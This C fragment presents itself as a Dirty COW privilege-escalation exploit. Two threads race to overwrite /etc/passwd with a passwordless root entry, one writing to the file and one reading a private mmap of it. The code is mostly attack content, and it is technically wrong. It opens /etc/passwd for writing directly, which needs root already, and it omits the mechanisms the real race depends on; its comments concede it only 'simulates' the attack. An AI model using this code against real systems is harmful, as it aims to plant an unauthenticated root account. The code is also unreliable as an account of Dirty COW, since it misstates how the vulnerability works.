char *filename = "/etc/passwd";
char *original_content;

// Content to write into the file (root user entry)
char *new_content = "root::0:0:root:/root:/bin/bash\n";

// Ptrace thread function to continuously write to the file
void *ptrace_thread(void *arg) {
    int fd = open(filename, O_RDWR);
    if (fd == -1) {
        perror("open");
        return NULL;
    }

    // Ptrace needs to attach to a process to manipulate its memory
    // Here, we simulate the effect by repeatedly writing to the file
    // This is a simplified representation of the ptrace interaction
    // In a real exploit, ptrace would be used to attach to a running process
    // and modify its memory directly, often in conjunction with mmap.
    for (int i = 0; i < 10000000; i++) {
        lseek(fd, 0, SEEK_SET);
        write(fd, new_content, strlen(new_content));
    }
    close(fd);
    return NULL;
}

// Mmap thread function to continuously trigger a page fault
void *mmap_thread(void *arg) {
    int fd = open(filename, O_RDWR);
    if (fd == -1) {
        perror("open");
        return NULL;
    }

    struct stat st;
    fstat(fd, &st);
    off_t size = st.st_size;

    // Map the file into memory
    char *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }

    // Continuously trigger a page fault by attempting to read from the mapped memory
    // while another thread is writing to the underlying file.
    // This race condition is the core of Dirty COW.
    for (int i = 0; i < 10000000; i++) {
        char c = map[0]; // Read from the mapped memory to trigger a page fault
    }

    munmap(map, size);
    close(fd);
    return NULL;
}

